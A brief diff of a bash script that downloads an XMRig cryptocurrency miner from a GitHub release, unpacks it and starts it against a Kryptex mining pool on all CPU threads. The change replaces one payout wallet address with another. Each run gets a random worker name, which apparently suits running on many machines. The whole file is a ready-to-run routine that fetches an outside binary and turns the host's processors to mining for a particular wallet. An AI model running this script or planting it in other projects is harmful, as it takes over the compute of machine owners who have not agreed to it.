@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz
 tar xf xmrig-6.22.2-linux-static-x64.tar.gz
-./xmrig --donate-level 1 -a rx/0 --url sal.kryptex.network:7777 --user SaLvs7hDXDzGc5SyXFscw4hMXB1UDX1iASNP7mhsvu2RawQWpEdZSifCLNP36eufYsYYN4MReWt5jdYRNWNiSbBpLpnt64NbKAC/$(echo $(shuf -i 1-15000 -n 1)-A) -k -t $(nproc --all) -t $(nproc --all)
+./xmrig --donate-level 1 -a rx/0 --url sal.kryptex.network:7777 --user SaLvs8aThaZEFv2PuhbUs7agGLgziMEk1YPQYzJjf4AMLJmc538prn5XwaQ2E3gQ2t6afH4xWtWAKNJ8trmDXaJC5vVJTQrchWf/$(echo $(shuf -i 1-15000 -n 1)-A) -k -t $(nproc --all) -t $(nproc --all)
